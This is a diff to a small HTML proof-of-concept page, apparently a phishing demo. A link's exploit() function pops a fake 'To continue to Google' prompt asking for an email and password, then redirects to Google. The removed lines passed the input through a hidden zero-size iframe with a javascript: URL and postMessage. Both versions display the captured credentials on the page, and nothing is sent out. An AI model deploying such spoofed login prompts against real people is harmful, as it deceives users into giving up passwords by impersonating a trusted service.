@@ -1,33 +1,25 @@
 <!DOCTYPE html>
 <html>
   <body>
-
     <script>
       function exploit() {
-        // New tab open to make user feel like something real is happening
-        window.open("https://www.google.com");
-
-        // Run prompt inside iframe and send result to parent
-        document.getElementById("phishFrame").src =
-          'javascript:var userInput = prompt("To continue to Google\\nPlease login with your email and password:", "Email / Password");\
-           if (userInput) {\
-             parent.postMessage(userInput, "*");\
-           }';
+        // Prompt before redirect
+        const userInput = prompt("To continue to Google\nPlease login with your email and password:", "Email / Password");
+        
+        if (userInput) {
+          // Optionally show entered data on page
+          const outputDiv = document.createElement("div");
+          outputDiv.textContent = `Entered Credentials: ${userInput}`;
+          document.body.appendChild(outputDiv);
+          
+          // Redirect to Google in the same tab
+          window.location.href = "https://www.google.com";
+        }
       }
-
-      // Listen for data from iframe
-      window.addEventListener("message", function(event) {
-        const outputDiv = document.createElement("div");
-        outputDiv.textContent = `Entered Credentials: ${event.data}`;
-        document.body.appendChild(outputDiv);
-      });
     </script>
 
     <a href="#" onclick="exploit();">
       <h1>Click here to go to Google.com</h1>
     </a>
-
-    <iframe id="phishFrame" style="width:0; height:0; border:0;"></iframe>
-
   </body>
 </html>
